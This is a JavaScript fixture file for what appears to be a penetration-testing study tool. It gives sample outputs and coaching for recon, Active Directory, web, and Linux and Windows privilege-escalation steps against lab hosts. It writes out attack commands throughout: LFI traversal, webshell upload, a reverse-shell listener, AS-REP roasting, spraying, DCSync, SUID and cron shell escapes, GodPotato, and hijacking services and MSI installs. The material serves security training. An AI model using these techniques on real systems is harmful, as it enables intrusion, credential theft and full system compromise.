/*!
 * obol data — study-fixtures.js — OBOL.STUDY_FIXTURES
 *
 * The one piece of the study cell NOT derivable from the packs: a representative sample of what each
 * move's output looks like, the one line that matters ("signal"), and a plain teach note about why.
 * A static site can't read the parser test fixtures at runtime, so these are embedded here — trimmed
 * but faithful to real tool output.
 *
 * `situation` / `choices` / `coach` drive the "Your turn" retrieval-practice gear. The verdict for
 * each choice (correct / also-valid / locked) is computed in study.js from the real requires — only
 * the choice set and the nuance coaching live here.
 *
 * Covers all five lanes: Recon · Active Directory · Web · Linux Privesc · Windows Privesc.
 */
(function (root) {
  'use strict';
  var OBOL = root.OBOL = root.OBOL || {};

  OBOL.STUDY_FIXTURES = {

    // ============================ RECON ============================
    'nmap-fast-open-ports': {
      output: [
        'Nmap scan report for 10.10.10.10',
        'Host is up (0.021s latency).',
        'PORT     STATE SERVICE',
        '22/tcp   open  ssh',
        '80/tcp   open  http',
        '445/tcp  open  microsoft-ds',
      ].join('\n'),
      signal: '80/tcp   open  http',
      teach: 'Every open port is a door. A fast all-ports sweep first tells you what to look at — here SSH, a web server, and SMB — before you spend time on any one service.',
      situation: 'You have a target IP and nothing else. Where do you start?',
      choices: ['nmap-fast-open-ports', 'nmap-version-scripts', 'recon-smb-anon', 'recon-web-triage'],
      coach: {
        'nmap-version-scripts': 'That is the right follow-up — but run a fast all-ports sweep first so you know which ports even exist before you fingerprint them.',
        'recon-smb-anon': 'You can only enumerate SMB once you know 445 is open. Scan first.',
        'recon-web-triage': 'Same — triage the web only after a scan confirms a web port is there.',
      },
    },
    'nmap-version-scripts': {
      output: [
        'PORT    STATE SERVICE VERSION',
        '22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu',
        '80/tcp  open  http    Apache httpd 2.4.49 ((Unix))',
        '|_http-title: Acme Corp',
        '445/tcp open  netbios-ssn Samba smbd 4.6.2',
      ].join('\n'),
      signal: 'Apache httpd 2.4.49',
      teach: 'Versions are leads. "Apache 2.4.49" is a specific, searchable build — many such versions have a public CVE. Always pull the version before deciding how to attack a service.',
      situation: 'Your fast scan found 22, 80 and 445 open. What next?',
      choices: ['nmap-version-scripts', 'recon-web-triage', 'recon-smb-anon', 'nmap-fast-open-ports'],
      coach: {
        'recon-web-triage': 'Good instinct, and valid — but a version/script scan on all the open ports at once gives you leads on SSH and SMB too, not just the web.',
        'recon-smb-anon': 'Also reasonable, but fingerprint the versions first; it is cheap and tells you which services are worth your time.',
        'nmap-fast-open-ports': 'Already done — you have the open ports. Now get the versions behind them.',
      },
    },
    'recon-smb-anon': {
      output: [
        'SMB  10.10.10.10  445  FILE01  [+] Guest session established',
        'SMB  10.10.10.10  445  FILE01  Share       Permissions  Remark',
        'SMB  10.10.10.10  445  FILE01  -----       -----------  ------',
        'SMB  10.10.10.10  445  FILE01  backups     READ',
        'SMB  10.10.10.10  445  FILE01  IPC$                     Remote IPC',
      ].join('\n'),
      signal: 'backups     READ',
      teach: 'A guest/anonymous session that lists shares is a gift. A READ share named "backups" is exactly where configs, scripts and credentials leak — spider it before anything else.',
      situation: 'The scan shows SMB open on 445 and you have no credentials. What do you try?',
      choices: ['recon-smb-anon', 'recon-web-triage', 'nmap-version-scripts'],
      coach: {
        'recon-web-triage': 'Fine if there is also a web port, but a free anonymous SMB check costs nothing and often hands you a readable share.',
        'nmap-version-scripts': 'You already know the service; now actually enumerate it.',
      },
    },
    'recon-web-triage': {
      output: [
        'http://10.10.10.10 [200 OK] Apache[2.4.49], HTTPServer[Apache/2.4.49 (Unix)],',
        '  PHP[8.0.1], WordPress[5.8], Title[Acme Corp Blog], IP[10.10.10.10]',
      ].join('\n'),
      signal: 'WordPress[5.8]',
      teach: 'Before poking a web app, name its stack. "WordPress 5.8 on PHP 8 / Apache 2.4.49" turns a blank page into a list of version-specific attacks to look up.',
      situation: 'Port 80 is open. Before brute-forcing anything, what do you do first?',
      choices: ['recon-web-triage', 'content-discovery', 'nmap-version-scripts'],
      coach: {
        'content-discovery': 'That comes next — but fingerprint the stack first, so your wordlists and attacks match the tech (a WordPress site wants a WordPress approach).',
        'nmap-version-scripts': 'Useful, but whatweb/triage tells you the app framework and CMS, which the nmap banner often misses.',
      },
    },

    // ============================ ACTIVE DIRECTORY ============================
    'ad-dc-identify': {
      output: [
        'PORT    STATE SERVICE',
        '88/tcp  open  kerberos-sec',
        '389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: acme.internal)',
        '445/tcp open  microsoft-ds',
        '464/tcp open  kpasswd5',
      ].join('\n'),
      signal: 'Domain: acme.internal',
      teach: 'Kerberos (88) + LDAP (389) on one host is the fingerprint of a Domain Controller, and the LDAP banner leaks the domain name — that name is what every later AD command needs.',
      situation: 'A fresh scan shows 88, 389 and 445 open on one host, and the LDAP banner names a domain.',
      choices: ['ad-dc-identify', 'ad-anon-ldap-enum', 'asrep-roast', 'dcsync'],
      coach: {
        'ad-anon-ldap-enum': 'That is the right next step — but only once you have confirmed this is the DC and captured the domain name. First, name the target.',
        'asrep-roast': 'Roasting needs a user list you do not have yet. You are one step too early.',
        'dcsync': 'DCSync replicates every hash — it needs Domain Admin. This is the endgame, not the opening.',
      },
    },
    'ad-anon-ldap-enum': {
      output: [
        'SMB   172.16.9.10  445  DC01  [*] Windows Server 2022 (name:DC01) (domain:acme.internal)',
        'LDAP  172.16.9.10  389  DC01  [+] acme.internal\\ (anonymous bind)',
        'LDAP  172.16.9.10  389  DC01  Administrator',
        'LDAP  172.16.9.10  389  DC01  jbloggs',
        'LDAP  172.16.9.10  389  DC01  tgibson',
        'LDAP  172.16.9.10  389  DC01  svc_backup',
      ].join('\n'),
      signal: '(anonymous bind)',
      teach: 'The DC answered an unauthenticated LDAP query and handed back account names. That user list is the seed for every no-creds AD attack that follows — roasting and spraying both need it.',
      situation: 'You have confirmed the DC and the domain is acme.internal. You hold no credentials yet.',
      choices: ['ad-anon-ldap-enum', 'asrep-roast', 'password-spray', 'dcsync'],
      coach: {
        'asrep-roast': 'Roasting needs a user list first. Get the list, then roast.',
        'password-spray': 'Spraying also needs the user list first — same prerequisite.',
        'dcsync': 'Needs Domain Admin. Far too early.',
      },
    },
    'asrep-roast': {
      output: [
        '[*] Getting TGT for jbloggs',
        "[-] User jbloggs doesn't have UF_DONT_REQUIRE_PREAUTH set",
        '[*] Getting TGT for tgibson',
        '$krb5asrep$23$tgibson@ACME.INTERNAL:a3b5c7d9e1f2043546576879a0b1c2d3$5e7b9d1f3a5c…',
        '[*] Getting TGT for svc_backup',
      ].join('\n'),
      signal: '$krb5asrep$23$',
      teach: 'Most users return "doesn\'t have UF_DONT_REQUIRE_PREAUTH set" — a dead end. The $krb5asrep$23$ line is an account with pre-auth disabled, so you just captured its password hash to crack offline.',
      situation: 'Anonymous LDAP handed you a user list and the DC answers on 88. You still have no credentials.',
      choices: ['asrep-roast', 'password-spray', 'kerberoast', 'dcsync'],
      coach: {
        'password-spray': 'Also valid off the user list — but it puts failed logons on the wire and risks lockout. AS-REP roasting gets crackable material with zero auth attempts, so it is the quieter opening move.',
        'kerberoast': 'Kerberoasting needs valid credentials to request service tickets — you have none. AS-REP roasting is its no-creds cousin: same idea, but it targets pre-auth-disabled accounts you can ask for anonymously.',
        'dcsync': 'Needs Domain Admin replication rights. This is the endgame, not step one.',
      },
    },
    'crack-asrep': {
      output: [
        '$krb5asrep$23$tgibson@ACME.INTERNAL:a3b5c7d9…:Autumn2026!',
        '',
        'Session..........: hashcat',
        'Status...........: Cracked',
        'Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)',
        'Recovered........: 1/1 (100.00%) Digests',
      ].join('\n'),
      signal: ':Autumn2026!',
      teach: 'hashcat recovered the plaintext after the colon. The AS-REP hash was only candidate material; a cracked password is a validated credential you can now actually log in with.',
      situation: 'You captured a $krb5asrep$23$ hash for tgibson and copied it to your box.',
      choices: ['crack-asrep', 'password-spray', 'ad-acl-abuse', 'dcsync'],
      coach: {
        'password-spray': 'You could spray, but you are holding a hash that may crack into a real password in seconds. Cash the hash you have first.',
        'ad-acl-abuse': 'ACL abuse needs a mapped attack path (BloodHound) and usually a foothold credential — you are not there yet.',
        'dcsync': 'Still needs Domain Admin. One cracked user is not that.',
      },
    },
    'password-spray': {
      output: [
        '2026/09/17 10:41:02 >  Using KDC(s):  172.16.9.10:88',
        '2026/09/17 10:41:03 >  [+] VALID LOGIN:  pparker@acme.internal:Autumn2026!',
        '2026/09/17 10:41:05 >  Done! Tested 48 logins (1 successes) in 2.882 seconds',
      ].join('\n'),
      signal: '[+] VALID LOGIN:',
      teach: 'One shared password tried against the whole user list found a hit. Spraying is loud — note the lockout risk — but a single valid login is a domain foothold. Spray one password, never many per account.',
      situation: 'You have a user list and the DC. AS-REP returned nothing roastable, so you try one seasonal password against everyone.',
      choices: ['password-spray', 'asrep-roast', 'kerberoast', 'dcsync'],
      coach: {
        'asrep-roast': 'Worth trying first (it is quieter), but if it returned nothing roastable, a careful single-password spray is the reasonable next swing.',
        'kerberoast': 'Still needs valid creds — which is exactly what the spray is trying to get you. Spray first, then roast service accounts.',
        'dcsync': 'Needs Domain Admin. A sprayed low-priv login is not that.',
      },
    },
    'ad-acl-abuse': {
      output: [
        '[+] svc-audit successfully added to group Help Desk Operators',
        'distinguishedName: CN=Help Desk Operators,CN=Users,DC=acme,DC=internal',
        'ActiveDirectoryRights: GenericAll',
      ].join('\n'),
      signal: 'GenericAll',
      teach: 'BloodHound showed your account holds GenericAll over an object, and you exercised it — adding yourself to a privileged group. ACL abuse is how a low-priv foothold walks a control path toward Domain Admin.',
      situation: 'You have a valid domain credential and BloodHound mapped a control path: your user has GenericAll over a privileged group.',
      choices: ['ad-acl-abuse', 'kerberoast', 'dcsync', 'asrep-roast'],
      coach: {
        'kerberoast': 'Reasonable with creds in hand, but you are holding a direct control-path edge to privilege — walk the ACL path rather than gambling on a crackable service ticket.',
        'dcsync': 'The right destination, but you need the replication rights first. The ACL abuse is how you get them.',
        'asrep-roast': 'You are well past the no-creds opening now — you already have a credential and a path.',
      },
    },
    'dcsync': {
      output: [
        '[*] Using the DRSUAPI method to get NTDS.DIT secrets',
        'acme.internal\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::',
        'acme.internal\\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::',
      ].join('\n'),
      signal: 'krbtgt:502:',
      teach: 'With replication rights you asked the DC to hand over password hashes. The krbtgt hash is the crown jewel — it mints golden tickets, which is total, persistent domain compromise.',
      situation: 'An ACL path escalated you to a principal with domain replication rights.',
      choices: ['dcsync', 'ad-acl-abuse', 'kerberoast', 'password-spray'],
      coach: {
        'ad-acl-abuse': 'That was the previous step — the one that got you the replication rights. You are past it now.',
        'kerberoast': 'Why crack one service account when you can replicate every hash in the domain? You are beyond this.',
        'password-spray': 'Far beneath where you are now — you hold replication rights over the whole domain.',
      },
    },

    // ============================ WEB ============================
    'content-discovery': {
      output: [
        '200      GET        24l      68w     /index.php',
        '301      GET         9l      28w     /admin => /admin/',
        '200      GET       112l     540w     /upload.php',
        '403      GET         9l      28w     /.git/',
      ].join('\n'),
      signal: '/upload.php',
      teach: 'Brute-forcing paths turns an empty site into a map. /upload.php is a classic file-upload foothold, and the 403 on /.git/ hints the source may be exposed. Hidden endpoints are new attack surface.',
      situation: 'You fingerprinted the web stack. Now you want to find what is actually reachable on the server.',
      choices: ['content-discovery', 'param-discovery', 'lfi-probe', 'recon-web-triage'],
      coach: {
        'param-discovery': 'That comes after you have pages to test — first discover the endpoints, then fuzz each one for hidden parameters.',
        'lfi-probe': 'You can only probe a parameter you have found. Map the site first.',
        'recon-web-triage': 'Already done — you know the stack. Now enumerate its content.',
      },
    },
    'param-discovery': {
      output: [
        '[*] Scanning http://10.10.10.10/view.php',
        '[+] Parameter detected: page',
        '[+] Parameter detected: file',
        '[+] Parameter detected: debug',
      ].join('\n'),
      signal: 'Parameter detected: page',
      teach: 'Pages often read hidden parameters the UI never shows. A page= or file= parameter is the doorway to Local File Inclusion; debug= can leak internals. Fuzzing params finds the injectable edge.',
      situation: 'Content discovery found /view.php but it renders blank with no obvious inputs.',
      choices: ['param-discovery', 'lfi-probe', 'content-discovery'],
      coach: {
        'lfi-probe': 'You need a parameter to probe first — view.php showed none, so fuzz for hidden ones before testing traversal.',
        'content-discovery': 'You already have the endpoint; now find its inputs.',
      },
    },
    'lfi-probe': {
      output: [
        '$ curl -s "http://10.10.10.10/view.php?page=../../../../etc/passwd"',
        'root:x:0:0:root:/root:/bin/bash',
        'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
        'mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false',
      ].join('\n'),
      signal: 'root:x:0:0:root',
      teach: 'When a traversal string returns /etc/passwd, arbitrary local file read is confirmed. That spirals into source disclosure, lifting creds from config files, and sometimes RCE via log poisoning or wrappers.',
      situation: 'You found a page=... parameter on view.php. How do you test whether it is injectable?',
      choices: ['lfi-probe', 'file-upload', 'param-discovery'],
      coach: {
        'file-upload': 'Different vector — only if there is an upload form. The page= parameter is begging for a traversal test first.',
        'param-discovery': 'You already have the parameter; now exploit it.',
      },
    },
    'file-upload': {
      output: [
        '$ curl -F "file=@shell.php" http://10.10.10.10/upload.php',
        'File uploaded: /uploads/shell.php',
        '$ curl "http://10.10.10.10/uploads/shell.php?cmd=id"',
        'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
      ].join('\n'),
      signal: 'uid=33(www-data)',
      teach: 'The upload accepted a .php file and the server executed it — the id output proves code execution as the web user. From here you trade the one-shot webshell for a real interactive shell.',
      situation: 'An upload form accepts files and you can reach /uploads/ in your browser.',
      choices: ['file-upload', 'web-shells', 'lfi-probe'],
      coach: {
        'web-shells': 'That is the very next step — once the upload lands a webshell, upgrade it to a reverse shell. But first you have to get the file to execute.',
        'lfi-probe': 'A different vector; you have a working upload path, so use it.',
      },
    },
    'web-shells': {
      output: [
        '$ nc -lvnp 4444',
        'listening on [any] 4444 ...',
        'connect to [10.10.14.2] from (UNKNOWN) [10.10.10.10] 51234',
        'www-data@web01:/var/www/html$ id',
        'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
      ].join('\n'),
      signal: 'www-data@web01:/var/www/html$',
      teach: 'The webshell fired a reverse connection back to your listener — now you have an interactive shell as www-data. That is your foothold; the next job is enumerating the box for a path to root.',
      situation: 'You have code execution through a webshell but it is clunky — one command per request.',
      choices: ['web-shells', 'linux-enum', 'file-upload'],
      coach: {
        'linux-enum': 'Right idea for after you have a proper shell — but upgrade the clunky webshell to an interactive reverse shell first, then enumerate.',
        'file-upload': 'Already done — the upload gave you the webshell you are now upgrading.',
      },
    },

    // ============================ LINUX PRIVESC ============================
    'linux-enum': {
      output: [
        '[+] Sudo version 1.8.31',
        '[+] SUID binaries:',
        '    -rwsr-xr-x 1 root root  /usr/bin/find',
        '[+] Writable cron file: /etc/cron.d/backup (root, every 2 min)',
      ].join('\n'),
      signal: '/usr/bin/find',
      teach: 'Enumeration is where privesc is won. One sweep surfaces every lead at once — a SUID GTFOBins binary, a sudo entry, a writable root cron. You rank the leads; you do not guess.',
      situation: 'You just landed an interactive shell as www-data. What is the very first thing you do?',
      choices: ['linux-enum', 'sudo-abuse', 'suid-gtfobins', 'cron-abuse'],
      coach: {
        'sudo-abuse': 'You cannot know your sudo rights until you enumerate — run the sweep (or sudo -l) first, then act on what it shows.',
        'suid-gtfobins': 'Same — enumerate to find which SUID binaries exist before trying to abuse one.',
        'cron-abuse': 'You have not found a writable cron yet. Enumerate first; it will point you at the real vector.',
      },
    },
    'sudo-abuse': {
      output: [
        '$ sudo -l',
        'Matching Defaults entries for www-data on web01:',
        '    env_reset, mail_badpass',
        'User www-data may run the following commands on web01:',
        '    (root) NOPASSWD: /usr/bin/find',
      ].join('\n'),
      signal: '(root) NOPASSWD: /usr/bin/find',
      teach: 'A NOPASSWD sudo entry on a GTFOBins binary is instant root — find has a documented shell escape (-exec /bin/sh). No password, no exploit, just the published technique.',
      situation: 'Enumeration flagged your sudo rights. You run sudo -l and see a NOPASSWD entry.',
      choices: ['sudo-abuse', 'suid-gtfobins', 'cron-abuse', 'linux-enum'],
      coach: {
        'suid-gtfobins': 'Valid if a SUID binary exists, but a NOPASSWD sudo entry on a GTFOBins binary is the cleanest, loudest-green path — take the sure thing.',
        'cron-abuse': 'Slower and needs a writable cron; you are holding a direct NOPASSWD-to-root ticket.',
        'linux-enum': 'Already done — enumeration is what handed you this sudo lead.',
      },
    },
    'suid-gtfobins': {
      output: [
        '$ find / -perm -4000 -type f 2>/dev/null',
        '/usr/bin/find',
        '/usr/bin/base64',
        '$ /usr/bin/find . -exec /bin/sh -p \\; -quit',
        '# id',
        'uid=33(www-data) euid=0(root)',
      ].join('\n'),
      signal: 'euid=0(root)',
      teach: 'A SUID-root binary runs as root no matter who launches it. If it is on GTFOBins (find, base64, nmap…), there is a published escape — euid=0 proves you are effectively root.',
      situation: 'Enumeration listed SUID binaries including /usr/bin/find, but you have no sudo rights.',
      choices: ['suid-gtfobins', 'sudo-abuse', 'pspy-monitor'],
      coach: {
        'sudo-abuse': 'There are no sudo rights here — that path is closed. The SUID bit on a GTFOBins binary is the open door.',
        'pspy-monitor': 'Worth running to catch cron jobs, but you already have a direct SUID-to-root binary in hand.',
      },
    },
    'pspy-monitor': {
      output: [
        '2026/09/18 12:00:01 CMD: UID=0    PID=20451   | /bin/bash /opt/backup.sh',
        '2026/09/18 12:00:01 CMD: UID=0    PID=20452   | /usr/bin/tar -czf /backup/web.tgz /var/www/*',
      ].join('\n'),
      signal: 'UID=0',
      teach: 'pspy watches processes without root, catching scheduled jobs you cannot see in crontab. A UID=0 job running a script (or a tar wildcard) on a timer is a textbook escalation if any part of it is writable.',
      situation: 'No sudo and no useful SUID binary. You suspect something runs on a schedule as root.',
      choices: ['pspy-monitor', 'cron-abuse', 'suid-gtfobins'],
      coach: {
        'cron-abuse': 'That is the payoff — but first you need to see the job and confirm it runs as root and touches something you can write. pspy shows you that.',
        'suid-gtfobins': 'Already checked — no usable SUID binary. Watch the process list instead.',
      },
    },
    'cron-abuse': {
      output: [
        '$ echo \'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash\' >> /opt/backup.sh',
        '... (wait for the 2-minute timer) ...',
        '$ /tmp/rootbash -p',
        '# id',
        'uid=33(www-data) euid=0(root) gid=33 egid=0(root)',
      ].join('\n'),
      signal: 'euid=0(root)',
      teach: 'The root cron ran your appended command, dropping a SUID root shell you then launched with -p. Writable script + root schedule = root. (Tar wildcard jobs fall the same way via --checkpoint-action.)',
      situation: 'pspy showed a root cron running /opt/backup.sh every 2 minutes, and that file is world-writable.',
      choices: ['cron-abuse', 'pspy-monitor', 'sudo-abuse'],
      coach: {
        'pspy-monitor': 'That was how you found the job — you are past it. Now abuse the writable script the job runs.',
        'sudo-abuse': 'No sudo rights here; the writable root cron is the live path.',
      },
    },

    // ============================ WINDOWS PRIVESC ============================
    'windows-enum': {
      output: [
        '[+] Current Token privileges',
        '    SeImpersonatePrivilege        Enabled',
        '[+] Unquoted Service Paths',
        '    C:\\Program Files\\Acme Agent\\agent.exe  (service: AcmeAgent)',
        '[+] AlwaysInstallElevated set to 1 (HKLM and HKCU)',
      ].join('\n'),
      signal: 'SeImpersonatePrivilege        Enabled',
      teach: 'winPEAS surfaces every Windows privesc vector in one pass. SeImpersonate enabled, an unquoted service path, AlwaysInstallElevated — any one of these is a path to SYSTEM. Enumerate, then pick.',
      situation: 'You have a shell as a low-privilege service account on Windows. First move?',
      choices: ['windows-enum', 'seimpersonate', 'unquoted-service-path', 'alwaysinstallelevated'],
      coach: {
        'seimpersonate': 'You cannot know you hold SeImpersonate until you check — enumerate privileges first, then fire the potato.',
        'unquoted-service-path': 'Only viable if such a service exists and a path is writable; the sweep tells you that.',
        'alwaysinstallelevated': 'Same — it only works if both registry keys are set. Enumerate to confirm before acting.',
      },
    },
    'seimpersonate': {
      output: [
        'C:\\> whoami /priv',
        'SeImpersonatePrivilege        Enabled',
        'C:\\> .\\GodPotato.exe -cmd "cmd /c whoami"',
        '[*] Exploiting...',
        'nt authority\\system',
      ].join('\n'),
      signal: 'nt authority\\system',
      teach: 'Service accounts usually hold SeImpersonatePrivilege, and the "potato" family turns that single privilege into a SYSTEM token. The whoami output confirms full compromise of the host.',
      situation: 'Enumeration shows your account has SeImpersonatePrivilege enabled.',
      choices: ['seimpersonate', 'unquoted-service-path', 'alwaysinstallelevated', 'windows-enum'],
      coach: {
        'unquoted-service-path': 'A valid alternative if one exists — but when you already hold SeImpersonate, the potato is the fastest, most reliable route to SYSTEM.',
        'alwaysinstallelevated': 'Also a path if the keys are set, but SeImpersonate is in hand right now.',
        'windows-enum': 'Already done — that is what told you SeImpersonate is enabled.',
      },
    },
    'unquoted-service-path': {
      output: [
        'C:\\> sc qc AcmeAgent',
        '        BINARY_PATH_NAME   : C:\\Program Files\\Acme Agent\\agent.exe',
        'C:\\> icacls "C:\\Program Files\\Acme Agent"',
        '        BUILTIN\\Users:(WD)',
      ].join('\n'),
      signal: 'BUILTIN\\Users:(WD)',
      teach: 'An unquoted path with a space lets Windows try C:\\Program.exe, then C:\\Program Files\\Acme.exe, before the real binary. If any of those directories is writable (WD) by you, drop a payload there and the service runs it as SYSTEM on restart.',
      situation: 'Enumeration flagged an unquoted service path, and you have no special privileges.',
      choices: ['unquoted-service-path', 'weak-service-permissions', 'seimpersonate'],
      coach: {
        'weak-service-permissions': 'Related and worth checking, but that abuses service ACLs directly — here the win is the writable directory in the unquoted path.',
        'seimpersonate': 'Only if you hold that privilege; this account does not. The unquoted path is the lead you have.',
      },
    },
    'weak-service-permissions': {
      output: [
        'C:\\> accesschk.exe -uwcqv "Users" AcmeAgent',
        '  RW AcmeAgent',
        '        SERVICE_ALL_ACCESS',
        'C:\\> sc config AcmeAgent binPath= "C:\\temp\\rev.exe"',
        '[SC] ChangeServiceConfig SUCCESS',
      ].join('\n'),
      signal: 'SERVICE_ALL_ACCESS',
      teach: 'SERVICE_ALL_ACCESS over a service means you can repoint its binary. Set binPath to your payload, restart the service, and it launches as whatever account the service runs under — usually SYSTEM.',
      situation: 'accesschk shows your group has write access to a service configuration.',
      choices: ['weak-service-permissions', 'unquoted-service-path', 'alwaysinstallelevated'],
      coach: {
        'unquoted-service-path': 'A different service-based trick; use it when the path is unquoted and a dir is writable. Here you can rewrite the service config directly — simpler.',
        'alwaysinstallelevated': 'Only if the MSI keys are set. You already hold write access to a service.',
      },
    },
    'alwaysinstallelevated': {
      output: [
        'C:\\> reg query HKLM\\...\\Installer /v AlwaysInstallElevated',
        '    AlwaysInstallElevated    REG_DWORD    0x1',
        'C:\\> reg query HKCU\\...\\Installer /v AlwaysInstallElevated',
        '    AlwaysInstallElevated    REG_DWORD    0x1',
        'C:\\> msiexec /quiet /qn /i rev.msi',
      ].join('\n'),
      signal: '0x1',
      teach: 'When AlwaysInstallElevated is 0x1 in BOTH HKLM and HKCU, any MSI you install runs as SYSTEM. Build a malicious MSI, run msiexec, and you escalate — a pure misconfiguration, no exploit needed.',
      situation: 'Enumeration shows AlwaysInstallElevated = 1. You check both hives to be sure.',
      choices: ['alwaysinstallelevated', 'seimpersonate', 'weak-service-permissions'],
      coach: {
        'seimpersonate': 'Only if you hold that privilege; this path is a registry misconfig instead. Both keys being 0x1 is a free SYSTEM.',
        'weak-service-permissions': 'A valid alternative when service ACLs are loose; here the MSI policy is the open door.',
      },
    },

  };
})(typeof globalThis !== 'undefined' ? globalThis : this);
